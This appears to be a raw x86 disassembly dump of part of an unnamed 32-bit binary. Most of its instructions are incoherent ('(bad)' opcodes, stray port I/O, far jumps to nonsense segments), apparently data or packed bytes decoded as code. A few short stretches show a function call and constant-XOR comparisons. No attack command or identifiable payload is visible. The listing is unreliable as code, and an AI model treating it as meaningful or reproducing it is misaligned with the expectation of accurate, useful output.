  41aa17:	test   eax,0xbc578060
  41aa1c:	mov    ecx,0x434cd7c4
  41aa21:	push   ebp
  41aa22:	mov    al,0x12
  41aa24:	mov    esp,0xe62da1d9
  41aa29:	cli    
  41aa2a:	test   al,0x26
  41aa2c:	and    BYTE PTR [esi+0x54],0xe4
  41aa30:	aas    
  41aa31:	push   ss
  41aa32:	in     al,0x2a
  41aa34:	dec    eax
  41aa35:	ret    0x659e
  41aa38:	rol    BYTE PTR ds:0x3127a3f9,0x6f
  41aa3f:	pop    edi
  41aa40:	jmp    0x1423:0x4ae642d4
  41aa47:	sbb    ah,bl
  41aa49:	(bad)  
  41aa4a:	mov    BYTE PTR [eax],cl
  41aa4c:	stc    
  41aa4d:	cld    
  41aa4e:	ss jmp 0x3cdd:0xe8094586
  41aa56:	das    
  41aa57:	int    0xf5
  41aa59:	dec    eax
  41aa5a:	or     al,0x90
  41aa5c:	sub    ch,bh
  41aa5e:	jne    0x41aa0a
  41aa60:	mov    eax,ds:0x15784465
  41aa65:	test   eax,0x55a227da
  41aa6a:	sar    BYTE PTR [ecx+0x1c74b46a],0x72
  41aa71:	push   ss
  41aa72:	jecxz  0x41aa77
  41aa74:	daa    
  41aa75:	gs adc al,0x8
  41aa78:	cmp    eax,0x69552137
  41aa7d:	xchg   ebx,eax
  41aa7e:	stc    
  41aa7f:	into   
  41aa80:	fsubr  DWORD PTR [edx-0x7a]
  41aa83:	scas   al,BYTE PTR es:[edi]
  41aa84:	repz and dl,0xb5
  41aa88:	lock mov ebx,0x2db5e774
  41aa8e:	sub    al,0xa
  41aa90:	sbb    ah,BYTE PTR [edi+0x11]
  41aa93:	push   edi
  41aa94:	jle    0x41aa9c
  41aa96:	cmp    esp,DWORD PTR [edi+0x61]
  41aa99:	pop    esp
  41aa9a:	call   0x1465:0xd73ac394
  41aaa1:	repnz mov ebx,DWORD PTR [edx+0x7a]
  41aaa5:	pop    esi
  41aaa6:	cmp    al,0x98
  41aaa8:	sub    eax,0xa023ad6c
  41aaad:	adc    eax,DWORD PTR [edi+ebx*2+0x5ca1d6ce]
  41aab4:	add    eax,0x27aed860
  41aab9:	or     BYTE PTR [ecx],0xac
  41aabc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aabd:	sub    BYTE PTR [esi+edx*2+0xb581c09],dl
  41aac4:	out    dx,eax
  41aac5:	ja     0x41aa9d
  41aac7:	cmp    ebx,edi
  41aac9:	test   al,0x36
  41aacb:	mov    dh,0x8e
  41aacd:	les    ebx,FWORD PTR [ebx]
  41aacf:	in     al,0x0
  41aad1:	xchg   ebx,eax
  41aad2:	fidiv  WORD PTR [esi-0x2f]
  41aad5:	sbb    ebp,ebp
  41aad7:	add    DWORD PTR gs:[eax],esp
  41aada:	add    BYTE PTR [esi-0x25],ah
  41aadd:	mov    ds:0xe4dc8c27,eax
  41aae2:	mov    edi,ebp
  41aae4:	out    dx,eax
  41aae5:	mov    edx,0xbd05efbc
  41aaea:	pusha  
  41aaeb:	(bad)  
  41aaec:	leave  
  41aaed:	inc    esp
  41aaee:	mov    bh,0x9f
  41aaf0:	sbb    DWORD PTR [edi-0x57097be8],edi
  41aaf6:	jle    0x41aab9
  41aaf8:	mov    DWORD PTR [edi+0x2c],eax
  41aafb:	sahf   
  41aafc:	jo     0x41aac5
  41aafe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aaff:	aaa    
  41ab00:	jmp    0x41ab45
  41ab02:	and    bl,dl
  41ab04:	cli    
  41ab05:	add    DWORD PTR [ebx+0x5334245c],ecx
  41ab0b:	push   ecx
  41ab0c:	push   edx
  41ab0d:	push   eax
  41ab0e:	call   0x422072
  41ab13:	mov    ecx,DWORD PTR [esp+0x48]
  41ab17:	mov    ebx,DWORD PTR [esp+0x4c]
  41ab1b:	push   ebx
  41ab1c:	push   ecx
  41ab1d:	push   edx
  41ab1e:	push   eax
  41ab1f:	call   0x422072
  41ab24:	mov    ecx,DWORD PTR [esp+0x50]
  41ab28:	mov    ebx,DWORD PTR [esp+0x54]
  41ab2c:	add    eax,ecx
  41ab2e:	mov    ecx,DWORD PTR [esp+0x88]
  41ab35:	adc    edx,ebx
  41ab37:	mov    ebx,DWORD PTR [esp+0x8c]
  41ab3e:	cmp    ecx,eax
  41ab40:	jne    0x41af1d
  41ab46:	cmp    ebx,edx
  41ab48:	jmp    0x41af17
  41ab4d:	xchg   esi,eax
  41ab4e:	loope  0x41ab41
  41ab50:	gs pop esi
  41ab52:	fs jp  0x41ab2f
  41ab55:	aam    0x4d
  41ab57:	imul   esi,DWORD PTR [eax-0x439a9ca5],0x72
  41ab5e:	lahf   
  41ab5f:	push   ss
  41ab60:	sbb    BYTE PTR [edx+edx*1+0x32781818],bh
  41ab67:	cmp    ebx,edi
  41ab69:	mov    edi,DWORD PTR [edi+ecx*8+0x98e2463]
  41ab70:	in     eax,dx
  41ab71:	pusha  
  41ab72:	iret   
  41ab73:	repz jmp 0x7063:0xc81fc299
  41ab7b:	jge    0x41abbe
  41ab7d:	retf   0x81fa
  41ab80:	lahf   
  41ab81:	loop   0x41ab9a
  41ab83:	and    al,0x40
  41ab85:	jne    0x41ab18
  41ab87:	push   0x21f6f59e
  41ab8c:	mov    bl,0x16
  41ab8e:	mov    cl,0xb8
  41ab90:	push   ebx
  41ab91:	mov    dh,0x82
  41ab93:	jmp    0x74633e3e
  41ab98:	push   esi
  41ab99:	sub    al,0xcf
  41ab9b:	fsub   QWORD PTR [ebp+0xe]
  41ab9e:	dec    edx
  41ab9f:	mov    al,ds:0x35d6da4
  41aba4:	xchg   esp,eax
  41aba5:	ret    0x7cb6
  41aba8:	cdq    
  41aba9:	mov    esi,0xbb1a9e70
  41abae:	mov    edi,0x542824cc
  41abb3:	ds jo  0x41abf8
  41abb6:	int    0xa4
  41abb8:	push   es
  41abb9:	mov    bh,BYTE PTR [esi-0x56]
  41abbc:	ds mov ecx,0x639de135
  41abc2:	pop    esi
  41abc3:	cwde   
  41abc4:	loope  0x41abf8
  41abc6:	mov    WORD PTR [ebx-0x3d22c03d],cs
  41abcc:	fistp  DWORD PTR [ebp+0x43a34b6]
  41abd2:	jle    0x41ab56
  41abd4:	ret    0x6435
  41abd7:	and    eax,0x6eeeb569
  41abdc:	ret    
  41abdd:	sub    eax,DWORD PTR [edi+eiz*8]
  41abe0:	pop    ss
  41abe1:	gs gs scas al,BYTE PTR es:[edi]
  41abe4:	add    DWORD PTR [eax+0x4b],ebp
  41abe7:	dec    edi
  41abe8:	call   0x5597:0x7f8c900a
  41abef:	sub    al,0x62
  41abf1:	adc    dh,bh
  41abf3:	push   ebx
  41abf4:	dec    esp
  41abf5:	je     0x41ab7b
  41abf7:	cld    
  41abf8:	xchg   ebx,eax
  41abf9:	cmp    BYTE PTR [ecx+0x2053cea8],0xdd
  41ac00:	rol    cl,cl
  41ac02:	stos   DWORD PTR es:[edi],eax
  41ac03:	inc    esi
  41ac04:	daa    
  41ac05:	(bad)  
  41ac06:	mov    ch,0xab
  41ac08:	stos   DWORD PTR es:[edi],eax
  41ac09:	or     esp,DWORD PTR [ebp-0x5b7bbbe5]
  41ac0f:	mov    dl,0x64
  41ac11:	scas   al,BYTE PTR es:[edi]
  41ac12:	and    dh,BYTE PTR [ecx]
  41ac14:	inc    esi
  41ac15:	out    0x8,al
  41ac17:	les    edi,FWORD PTR [ecx-0x8]
  41ac1a:	shl    BYTE PTR [esi+edi*1],1
  41ac1d:	add    edx,DWORD PTR [ecx+0x19b556d5]
  41ac23:	push   0xffffffec
  41ac25:	ss sub eax,0xd8a7e2d5
  41ac2b:	rcl    ecx,0xb2
  41ac2e:	dec    ebx
  41ac2f:	adc    BYTE PTR [edx],bl
  41ac31:	in     eax,dx
  41ac32:	lods   al,BYTE PTR ds:[esi]
  41ac33:	popf   
  41ac34:	and    BYTE PTR [edx-0x3dc6099],0x47
  41ac3b:	push   es
  41ac3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac3d:	ins    BYTE PTR es:[edi],dx
  41ac3e:	add    DWORD PTR [ebx],edx
  41ac40:	into   
  41ac41:	scas   al,BYTE PTR es:[edi]
  41ac42:	not    BYTE PTR [ebp-0x34]
  41ac45:	or     DWORD PTR [ebx+0xeda9102],esi
  41ac4b:	inc    ebp
  41ac4c:	dec    ebp
  41ac4d:	aam    0x92
  41ac4f:	scas   al,BYTE PTR es:[edi]
  41ac50:	sub    al,0x93
  41ac52:	push   ds
  41ac53:	sbb    DWORD PTR [edi],esp
  41ac55:	aad    0x13
  41ac57:	xor    edi,ecx
  41ac59:	mov    DWORD PTR [edx+eiz*8],ebx
  41ac5c:	ins    BYTE PTR es:[edi],dx
  41ac5d:	imul   ebx,DWORD PTR [ebx],0xe1f29bea
  41ac63:	fisubr DWORD PTR [eax+0x25e299aa]
  41ac69:	add    BYTE PTR [ebp+0x5a],0xc3
  41ac6d:	jecxz  0x41ac7c
  41ac6f:	xchg   ecx,eax
  41ac70:	sub    DWORD PTR [eax+ebp*2+0x2a95166c],eax
  41ac77:	pop    ss
  41ac78:	bound  edx,QWORD PTR gs:[edx-0xe12ec52]
  41ac7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac80:	ins    DWORD PTR es:[edi],dx
  41ac81:	popa   
  41ac82:	outs   dx,DWORD PTR ds:[esi]
  41ac83:	xchg   ecx,eax
  41ac84:	fnstcw WORD PTR [ecx]
  41ac86:	lock aam 0x36
  41ac89:	add    al,0x50
  41ac8b:	dec    esi
  41ac8c:	aad    0x3d
  41ac8e:	aad    0xc6
  41ac90:	or     DWORD PTR [ebx-0x76ad9b8d],0x3e396ce5
  41ac9a:	sbb    al,0x46
  41ac9c:	mov    eax,0xd43236da
  41aca1:	test   eax,0xf44401ec
  41aca6:	push   ds
  41aca7:	xchg   edi,eax
  41aca8:	popf   
  41aca9:	sbb    al,BYTE PTR [edi+0x103271fa]
  41acaf:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41acb1:	daa    
  41acb2:	(bad)  
  41acb3:	push   0xf2474d7e
  41acb8:	jl     0x41ac4c
  41acba:	xor    cl,BYTE PTR [ecx]
  41acbc:	data16 cli 
  41acbe:	xchg   edi,eax
  41acbf:	test   eax,0xee9231ad
  41acc4:	mov    edx,0x4be395e0
  41acc9:	pop    esi
  41acca:	or     al,0x17
  41accc:	push   0xa0679889
  41acd1:	lods   al,BYTE PTR fs:[esi]
  41acd3:	inc    BYTE PTR [eax+ebx*4-0x308f3d9a]
  41acda:	pop    esi
  41acdb:	rcr    BYTE PTR [eax],1
  41acdd:	mov    esp,0x48812786
  41ace2:	das    
  41ace3:	int3   
  41ace4:	rcl    BYTE PTR [edi+0x73],cl
  41ace7:	mov    cl,0xec
  41ace9:	fwait
  41acea:	loopne 0x41ad35
  41acec:	jmp    0xd9d2:0x591b
  41acf2:	cmc    
  41acf3:	xrelease xchg BYTE PTR [edi+0x5d],dl
  41acf7:	mov    ds:0xe4c81ad3,al
  41acfc:	push   es
  41acfd:	scas   al,BYTE PTR es:[edi]
  41acfe:	shr    ebx,1
  41ad00:	xlat   BYTE PTR ds:[ebx]
  41ad01:	out    0xc5,al
  41ad03:	lea    edi,[edx+eiz*1+0x1f3024f0]
  41ad0a:	jecxz  0x41ad4c
  41ad0c:	pop    ss
  41ad0d:	int    0x41
  41ad0f:	or     al,0x2e
  41ad11:	test   DWORD PTR [edx+0x5d],edi
  41ad14:	in     eax,0xab
  41ad16:	repz cmp cl,BYTE PTR [ecx]
  41ad19:	xchg   DWORD PTR [eax+ecx*2-0x55e128b0],eax
  41ad20:	out    0x30,eax
  41ad22:	(bad)  
  41ad23:	call   0x2b9ed553
  41ad28:	ins    BYTE PTR es:[edi],dx
  41ad29:	cs and ch,cl
  41ad2c:	imul   esi,DWORD PTR [edi],0x1e
  41ad2f:	rcl    BYTE PTR [edi+esi*1-0x42],1
  41ad33:	cmp    DWORD PTR [edi+0x335ae953],0xffffff85
  41ad3a:	mov    bl,0xd7
  41ad3c:	jbe    0x41ad5a
  41ad3e:	cmp    esp,ecx
  41ad40:	ja     0x41ad6f
  41ad42:	xor    BYTE PTR [edx-0x50],cl
  41ad45:	lds    edx,FWORD PTR [eax-0xa]
  41ad48:	icebp  
  41ad49:	xchg   edx,eax
  41ad4a:	bound  bp,DWORD PTR [edx+0x57]
  41ad4e:	xor    eax,0x8e0d1bec
  41ad53:	adc    DWORD PTR ds:0x291dc158,0xffffffdc
  41ad5a:	xor    cl,BYTE PTR [eax-0x77]
  41ad5d:	mov    ds,WORD PTR ds:0x372a393d
  41ad63:	and    BYTE PTR [edi+0x64],0xa6
  41ad67:	lock lock (bad) [ebx-0x7b43cf45]
  41ad6f:	fwait
  41ad70:	xor    dh,BYTE PTR [edx+edx*4+0x39750071]
  41ad77:	or     al,0x12
  41ad79:	fstp   QWORD PTR [ecx+0x16886ca8]
  41ad7f:	shl    BYTE PTR [edx],0x8a
  41ad82:	les    esi,FWORD PTR [eax-0xa88ab8f]
  41ad88:	adc    al,0xa0
  41ad8a:	push   0x978b4a5e
  41ad8f:	test   BYTE PTR [ecx+0x14e353ea],al
  41ad95:	loopne 0x41ae05
  41ad97:	inc    ebp
  41ad98:	add    DWORD PTR [eax],ecx
  41ad9a:	(bad)  
  41ad9b:	mov    ds:0x18c2889d,eax
  41ada0:	int    0xaf
  41ada2:	jmp    0x85deffbf
  41ada7:	xor    edi,edi
  41ada9:	mov    ds:0xd3f5a805,eax
  41adae:	mov    eax,0x31a00daa
  41adb3:	rcr    ecx,cl
  41adb5:	cdq    
  41adb6:	dec    ecx
  41adb7:	jno    0x41ad56
  41adb9:	dec    edi
  41adba:	cmove  esp,DWORD PTR [ebp-0x67241c6d]
  41adc1:	test   al,0xbe
  41adc3:	fstp   st(1)
  41adc5:	xor    DWORD PTR [eax+0x10786906],ecx
  41adcb:	push   0x6b0a6782
  41add0:	ins    BYTE PTR es:[edi],dx
  41add1:	or     ebp,eax
  41add3:	jmp    0x41ad5f
  41add5:	pop    edx
  41add6:	inc    eax
  41add7:	pop    ebp
  41add8:	inc    ebx
  41add9:	cmp    ah,cl
  41addb:	neg    BYTE PTR [eax+edx*1+0x7b3c9062]
  41ade2:	dec    ecx
  41ade3:	xor    al,0x40
  41ade5:	je     0x41ad6c
  41ade7:	cmp    DWORD PTR [edi-0x3d228791],eax
  41aded:	cmp    ebx,ebx
  41adef:	call   0xf0309965
  41adf4:	mov    ch,0x89
  41adf6:	cmp    ah,BYTE PTR [esi-0x7910af99]
  41adfc:	cmp    dh,cl
  41adfe:	xlat   BYTE PTR ds:[ebx]
  41adff:	sbb    BYTE PTR [eax+ebx*1],bl
  41ae02:	mov    eax,0x1dc40e4b
  41ae07:	jg     0x41ae0f
  41ae09:	mov    ch,0x2e
  41ae0b:	rcl    DWORD PTR [ebx+edi*1-0x61],cl
  41ae0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae10:	push   eax
  41ae11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae12:	in     al,0x56
  41ae14:	sbb    eax,0xb2bbd9de
  41ae19:	fdiv   QWORD PTR [edi-0x52a42b1f]
  41ae1f:	outs   dx,BYTE PTR ds:[esi]
  41ae20:	pushf  
  41ae21:	cmp    eax,0x305b7943
  41ae26:	push   es
  41ae27:	lods   al,BYTE PTR ds:[esi]
  41ae28:	pushf  
  41ae29:	sbb    dh,BYTE PTR [edx+0x4029ac7e]
  41ae2f:	push   ss
  41ae30:	adc    BYTE PTR [esi-0x1d],dh
  41ae33:	imul   ebx,DWORD PTR [eax+0xc03ec49],0x8e24e33f
  41ae3d:	lods   eax,DWORD PTR ds:[esi]
  41ae3e:	jg     0x41ae77
  41ae40:	jae    0x41ae3d
  41ae42:	or     edx,DWORD PTR [esi+edx*1-0x5fe1bed6]
  41ae49:	sahf   
  41ae4a:	(bad)  
  41ae4b:	sti    
  41ae4c:	retf   0xfe08
  41ae4f:	std    
  41ae50:	xor    esi,DWORD PTR [edx+0xbf0fde]
  41ae56:	push   edx
  41ae57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae58:	dec    edi
  41ae59:	or     esi,DWORD PTR [ebx-0x17f01451]
  41ae5f:	retf   0x514a
  41ae62:	pushf  
  41ae63:	cmp    DWORD PTR [ebp-0x1bf7dfd9],edi
  41ae69:	in     al,dx
  41ae6a:	std    
  41ae6b:	and    BYTE PTR [edx],dh
  41ae6d:	jg     0x41ae9a
  41ae6f:	mov    esp,0xb3cf16cd
  41ae74:	repnz shl DWORD PTR [esi+0x14],1
  41ae78:	sbb    bh,BYTE PTR [ebx]
  41ae7a:	sbb    al,0x40
  41ae7c:	jle    0x41aea4
  41ae7e:	out    0xff,al
  41ae80:	mov    dl,0xb1
  41ae82:	ins    DWORD PTR es:[edi],dx
  41ae83:	mov    esp,0xcc28ad9d
  41ae88:	cmp    BYTE PTR cs:[edi-0x45],ch
  41ae8c:	rcl    eax,0x1a
  41ae8f:	mov    eax,ds:0xbb6e1eda
  41ae94:	inc    edx
  41ae95:	and    BYTE PTR [edi],dh
  41ae97:	or     BYTE PTR [esp+ecx*2+0x166d3ae5],ah
  41ae9e:	scas   eax,DWORD PTR es:[edi]
  41ae9f:	inc    eax
  41aea0:	mov    esi,0xe821cb00
  41aea5:	scas   al,BYTE PTR es:[edi]
  41aea6:	pop    edx
  41aea7:	mov    ah,0x75
  41aea9:	and    eax,0x14f8dd2a
  41aeae:	js     0x41af16
  41aeb0:	mov    eax,0x79c15325
  41aeb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aeb6:	or     ch,BYTE PTR [edi-0x2f]
  41aeb9:	pop    ss
  41aeba:	push   es
  41aebb:	ret    
  41aebc:	popa   
  41aebd:	inc    DWORD PTR [eax]
  41aebf:	stos   DWORD PTR es:[edi],eax
  41aec0:	push   es
  41aec1:	sub    cl,BYTE PTR [ecx+ebp*8+0x30]
  41aec5:	dec    ebx
  41aec6:	call   0xd9e15587
  41aecb:	xlat   BYTE PTR ds:[ebx]
  41aecc:	into   
  41aecd:	stos   BYTE PTR es:[edi],al
  41aece:	in     al,0x42
  41aed0:	pop    esp
  41aed1:	xor    edi,DWORD PTR fs:[eax]
  41aed4:	es je  0x41ae57
  41aed7:	call   0xd59da63c
  41aedc:	hlt    
  41aedd:	jmp    0xe84272b3
  41aee2:	pop    dx
  41aee4:	and    esi,DWORD PTR [ecx+0x721339f3]
  41aeea:	test   edi,ebp
  41aeec:	push   esi
  41aeed:	mov    esi,0xc66db1ca
  41aef2:	int3   
  41aef3:	mov    ebx,0xd4b61852
  41aef8:	loopne 0x41aedb
  41aefa:	mov    eax,0x10120752
  41aeff:	call   FWORD PTR [esi+0x16]
  41af02:	push   esp
  41af03:	dec    eax
  41af04:	rcl    DWORD PTR [edi],0xe1
  41af07:	pop    es
  41af08:	lock xor bh,bh
  41af0b:	mov    DWORD PTR [esi+0x39],edi
  41af0e:	dec    ebp
  41af0f:	sbb    dl,BYTE PTR [ebp+0x5a]
  41af12:	scas   eax,DWORD PTR es:[edi]
  41af13:	push   0xffe38f2
  41af18:	test   BYTE PTR [edx+ebp*1],al
  41af1b:	add    BYTE PTR [eax],al
  41af1d:	mov    eax,DWORD PTR [esp+0x40]
  41af21:	mov    edx,DWORD PTR [esp+0x18]
  41af25:	xor    ecx,ecx
  41af27:	shld   ecx,eax,0x2
  41af2b:	shl    eax,0x2
  41af2e:	mov    ebx,0xca79a575
  41af33:	mov    DWORD PTR [esp+0x10],edx
  41af37:	mov    edx,DWORD PTR [esp+0x1c]
  41af3b:	xor    eax,ebx
  41af3d:	xor    ecx,esi
  41af3f:	mov    DWORD PTR [esp+0x14],edx
  41af43:	cmp    eax,DWORD PTR [esp+0x10]
  41af47:	jne    0x41af55
  41af4d:	cmp    ecx,edx
  41af4f:	je     0x41d926
  41af55:	mov    eax,DWORD PTR [esp+0x44]
  41af59:	cmp    eax,0xa4069aaa
  41af5e:	je     0x41b750
  41af64:	mov    edx,DWORD PTR [esp+0x18]
  41af68:	mov    eax,DWORD PTR [esp+0x1c]
  41af6c:	xor    eax,esi
  41af6e:	jmp    0x41b33d
  41af73:	popa   
  41af74:	cmp    edx,ecx
  41af76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af77:	stos   DWORD PTR es:[edi],eax
  41af78:	and    bl,BYTE PTR [esi+0x3a]
  41af7b:	ins    DWORD PTR es:[edi],dx
  41af7c:	jnp    0x41af01
  41af7e:	jl     0x41afe8
  41af80:	mov    eax,ds:0x971770a1
  41af85:	push   ss
  41af86:	sbb    BYTE PTR [edx+edx*1+0x3f7e1818],bh
  41af8d:	sub    al,0x30
  41af8f:	dec    edx
  41af90:	dec    esi
  41af91:	push   0xffffffeb
  41af93:	int3   
  41af94:	scas   al,BYTE PTR es:[edi]
  41af95:	test   BYTE PTR [edx],ah
  41af97:	add    bh,cl
  41af99:	push   edi
  41af9a:	push   ds
  41af9b:	sub    eax,0xb98d890d
  41afa0:	jne    0x41afb0
  41afa2:	fisub  DWORD PTR [ebx]
  41afa4:	(bad)  
  41afa6:	push   eax
  41afa7:	rol    BYTE PTR [ebx],1
  41afa9:	push   edi
  41afaa:	into   
  41afab:	push   es
  41afac:	cli    
  41afad:	jo     0x41af62
  41afaf:	inc    esp
  41afb0:	xchg   esi,eax
  41afb1:	fisub  DWORD PTR ds:0xff22b5bf
  41afb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41afb8:	pushf  
  41afb9:	xchg   esi,eax
  41afba:	aad    0x75
  41afbc:	popa   
  41afbd:	mov    dl,0x11
  41afbf:	jle    0x41af91
  41afc1:	mov    eax,ds:0xe5419b27
  41afc6:	stos   BYTE PTR es:[edi],al
  41afc7:	icebp  
  41afc8:	push   esi
  41afc9:	push   ebx
  41afca:	inc    esi
  41afcb:	inc    edi
  41afcc:	dec    eax
  41afcd:	enter  0xffa1,0xb6
  41afd1:	cmp    eax,0x3454f0d9
  41afd6:	push   esp
  41afd7:	add    BYTE PTR [esi],al
  41afd9:	xor    eax,0xb05bc2c0
  41afde:	stos   BYTE PTR es:[edi],al
  41afdf:	rcl    DWORD PTR [edx-0x12],0x1a
  41afe3:	jae    0x41b01a
  41afe5:	aad    0xed
  41afe7:	mov    eax,DWORD PTR [ecx+0x53de733c]
  41afed:	xchg   ebp,eax
  41afee:	daa    
  41afef:	fbld   TBYTE PTR [edi+eiz*1+0x3c]
  41aff3:	adc    eax,0x7a95e40e
  41aff8:	shl    eax,0xf5
  41affb:	and    eax,0xf3f1f61a
  41b000:	sbb    dl,al
  41b002:	mov    dl,0x88
  41b004:	ret    
  41b005:	or     edx,eax
  41b007:	cwde   
  41b008:	xor    BYTE PTR [ebx],ch
  41b00a:	dec    edi
  41b00b:	addr16 add eax,0x2f13601e
  41b011:	push   0x59
  41b013:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b014:	cli    
  41b015:	cmp    DWORD PTR [ebx],esi
  41b017:	xor    dh,BYTE PTR [eax+edi*4+0x745258db]
  41b01e:	pop    eax
  41b01f:	(bad)  
  41b020:	lahf   
  41b021:	out    0x7c,al
  41b023:	mov    edx,0x538affcc
  41b028:	mov    ds:0x8632fdda,al
  41b02d:	add    BYTE PTR [edx+0x1df16eb9],dl
  41b033:	sbb    BYTE PTR [ecx],0x8f
  41b036:	push   0xffffffee
  41b038:	enter  0x672f,0x13
  41b03c:	add    DWORD PTR [ebp+0x5],esp
  41b03f:	jae    0x41b041
  41b041:	stc    
  41b042:	call   0xa8b0d45b
  41b047:	out    0x57,al
  41b049:	mov    esp,0xd35efd32
  41b04e:	xor    BYTE PTR [ebp+0x727f3d46],al
  41b054:	out    0x40,eax
  41b056:	cmc    
  41b057:	aaa    
  41b058:	lods   eax,DWORD PTR ds:[esi]
  41b059:	pop    ecx
  41b05a:	and    dh,BYTE PTR [eax]
  41b05c:	ins    DWORD PTR es:[edi],dx
  41b05d:	dec    ebx
  41b05e:	ins    BYTE PTR es:[edi],dx
  41b05f:	jle    0x41b086
  41b061:	jno    0x41b0c6
  41b063:	ficom  WORD PTR [ecx+0x34]
  41b066:	test   BYTE PTR [ebp+0x9],ch
  41b069:	(bad)  
  41b06a:	(bad)  
  41b06b:	pop    edx
  41b06c:	mov    dl,0x13
  41b06e:	jmp    0x41b03f
  41b070:	mov    eax,0xcc6b2be6
  41b075:	add    al,0xe8
  41b077:	inc    ebp
  41b078:	cmp    al,0x47
  41b07a:	or     dh,BYTE PTR [ebp-0x5e4dac9b]
  41b080:	mov    ds:0x93a3f94e,eax
  41b085:	fistp  QWORD PTR [ebx+0x60]
  41b088:	cmp    bh,cl
  41b08a:	push   cs
  41b08b:	xchg   ebx,eax
  41b08c:	cmp    BYTE PTR [ecx+0x1f],bh
  41b08f:	jecxz  0x41b09b
  41b091:	and    ebp,DWORD PTR [edx]
  41b093:	cs xchg esi,eax
  41b095:	dec    eax
  41b096:	test   eax,0xbd4a8560
  41b09b:	xchg   ecx,eax
  41b09c:	adc    eax,0x9e04dc6d
  41b0a1:	loopne 0x41b107
  41b0a3:	pop    ds
  41b0a4:	jns    0x41b0ed
  41b0a6:	sbb    cl,BYTE PTR [ebp-0x577e8fc8]
  41b0ac:	xor    eax,0xbe80e7a
  41b0b1:	call   0x4d7e:0x16b7933
  41b0b8:	inc    eax
  41b0b9:	jge    0x41b03c
  41b0bb:	or     eax,0xfca9ce2c
  41b0c0:	inc    eax
  41b0c1:	lahf   
  41b0c2:	sub    eax,0xc84ef436
  41b0c7:	pop    es
  41b0c8:	cmp    BYTE PTR [ebp+0x58],bl
  41b0cb:	pop    es
  41b0cc:	dec    edx
  41b0cd:	mov    eax,ds:0xe1e4c0f4
  41b0d2:	(bad)  
  41b0d3:	dec    edi
  41b0d4:	in     eax,dx
  41b0d5:	cmc    
  41b0d6:	adc    ebp,DWORD PTR [eax-0x56]
  41b0d9:	lods   eax,DWORD PTR ds:[esi]
  41b0da:	push   ss
  41b0db:	mov    edx,eax
  41b0dd:	jl     0x41b0eb
  41b0df:	or     eax,0xb354b65b
  41b0e4:	jb     0x41b073
  41b0e6:	mov    eax,0xbb20c33f
  41b0eb:	pop    ebp
  41b0ec:	retf   0x3d12
  41b0ef:	mov    esi,0x3ab02653
  41b0f4:	fnstsw WORD PTR [edi+0x6aef3b39]
  41b0fa:	jno    0x41b0b1
  41b0fc:	jo     0x41b16e
  41b0fe:	ja     0x41b15d
  41b100:	shl    DWORD PTR [edx-0x1],cl
  41b103:	lods   al,BYTE PTR ds:[esi]
  41b104:	and    eax,0x883788db
  41b109:	test   eax,0x350ca7ab
  41b10e:	mov    eax,ds:0x35f9186e
  41b113:	test   eax,0x5e15a007
  41b118:	loop   0x41b0c6
  41b11a:	jmp    0x41b111
  41b11c:	mov    al,0x4c
  41b11e:	jmp    0xf1725313
  41b123:	push   esi
  41b124:	arpl   WORD PTR [edi+ebp*1],dx
  41b127:	arpl   WORD PTR [eax-0x13dd781f],cx
  41b12d:	aad    0x4c
  41b12f:	jp     0x41b102
  41b131:	mov    ss,esp
  41b133:	jge    0x41b194
  41b135:	add    esp,DWORD PTR [edi]
  41b137:	dec    ecx
  41b138:	(bad)  
  41b13b:	mov    ecx,0xb61d8a12
  41b140:	jns    0x41b122
  41b142:	fdivr  QWORD PTR [edx-0x693f9875]
  41b148:	aam    0xa1
  41b14a:	cs cld 
  41b14c:	cld    
  41b14d:	outs   dx,DWORD PTR ds:[esi]
  41b14e:	enter  0x969f,0xa1
  41b152:	sahf   
  41b153:	fcom   QWORD PTR [esi-0x28]
  41b156:	repnz mov ch,dl
  41b159:	mov    ecx,0x895e0d1d
  41b15e:	push   esp
  41b15f:	jg     0x41b12d
  41b161:	push   edi
  41b162:	push   ebx
  41b163:	push   edx
  41b164:	jbe    0x41b0ef
  41b166:	dec    ecx
  41b167:	sar    al,1
  41b169:	es add edx,esp
  41b16c:	aaa    
  41b16d:	ja     0x41b0ff
  41b16f:	push   ds
  41b170:	pop    ds
  41b171:	jmp    0x9411:0xb6aa6901
  41b178:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b179:	inc    ebx
  41b17a:	pop    ss
  41b17b:	mov    dl,0x59
  41b17d:	div    BYTE PTR [edx-0x33b27583]
  41b183:	mov    al,BYTE PTR [edx]
  41b185:	xor    ch,BYTE PTR [edi+0x7b]
  41b188:	dec    sp
  41b18a:	lods   al,BYTE PTR ds:[esi]
  41b18b:	test   al,0x92
  41b18d:	mov    ebp,0xaba9bca2
  41b192:	xchg   esi,ebp
  41b194:	sub    esp,DWORD PTR gs:[esi+eax*1-0xfd3ed46]
  41b19c:	mov    cl,0x4d
  41b19e:	fdiv   QWORD PTR [ebx+esi*2+0x5452567e]
  41b1a5:	and    al,0xf7
  41b1a7:	pop    esp
  41b1a8:	push   0xbc9bfebd
  41b1ad:	pop    ds
  41b1ae:	xor    BYTE PTR [ecx+ebx*8+0x42],bl
  41b1b2:	cmp    dl,BYTE PTR [esi+0x4b]
  41b1b5:	lahf   
  41b1b6:	int    0xad
  41b1b8:	retf   
  41b1b9:	outs   dx,DWORD PTR ds:[esi]
  41b1ba:	adc    DWORD PTR [ebx+edx*8],edx
  41b1bd:	and    eax,0xa3cedd95
  41b1c2:	dec    edi
  41b1c3:	imul   ebx,eax,0x842c5b6e
  41b1c9:	mov    esp,ebp
  41b1cb:	jl     0x41b173
  41b1cd:	sti    
  41b1ce:	fst    QWORD PTR cs:[ebx+edx*4+0x48]
  41b1d3:	scas   al,BYTE PTR es:[edi]
  41b1d4:	scas   eax,DWORD PTR es:[edi]
  41b1d5:	cld    
